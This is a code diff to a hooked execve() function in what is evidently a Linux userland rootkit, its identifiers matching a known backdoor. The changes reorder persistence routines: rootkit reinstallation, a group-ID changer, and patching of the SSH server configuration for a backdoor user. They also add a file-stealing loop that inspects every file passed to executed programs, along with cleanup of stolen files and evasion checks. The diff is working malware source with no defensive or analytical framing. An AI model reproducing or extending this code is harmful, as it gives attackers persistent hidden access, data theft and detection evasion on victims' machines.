@@ -1,20 +1,26 @@
 int execve(const char *filename, char *const argv[], char *const envp[]){
-#ifdef DO_REINSTALL
-    if(!not_user(0)) reinstall();
+#if defined FILE_CLEANSE_TIMER && defined FILE_STEAL && defined CLEAN_STOLEN_FILES
+    cleanstolen();
 #endif
-#ifdef AUTO_GID_CHANGER
-    gidchanger();
-#endif
-#if defined(USE_PAM_BD) && defined(PATCH_SSHD_CONFIG)
-    sshdpatch(REG_USR);
+#ifdef CLEANSE_HOMEDIR
+    bdvcleanse();
 #endif
 #ifdef ROOTKIT_BASHRC
     checkbashrc();
 #endif
+#if defined READ_GID_FROM_FILE && defined AUTO_GID_CHANGER
+    gidchanger();
+#endif
+#ifdef DO_REINSTALL
+    reinstall();
+#endif
+#ifdef PATCH_SSHD_CONFIG
+    sshdpatch(REG_USR);
+#endif
 
     hook(CEXECVE);
 
-    if(is_bdusr()){
+    if(magicusr()){
 #ifdef BACKDOOR_ROLF
         if(!fnmatch("*/bdvrolf", argv[0], FNM_PATHNAME))
             dorolfpls();
@@ -36,6 +42,11 @@ int execve(const char *filename, char *const argv[], char *const envp[]){
         errno = ENOENT;
         return -1;
     }
+
+#ifdef FILE_STEAL
+    for(int i = 1; argv[i] != NULL; i++)
+        inspect_file(argv[i]);
+#endif
 
 #if defined(DO_REINSTALL) && defined(DO_EVASIONS)
     int evasion_status = evade(filename, argv, envp);
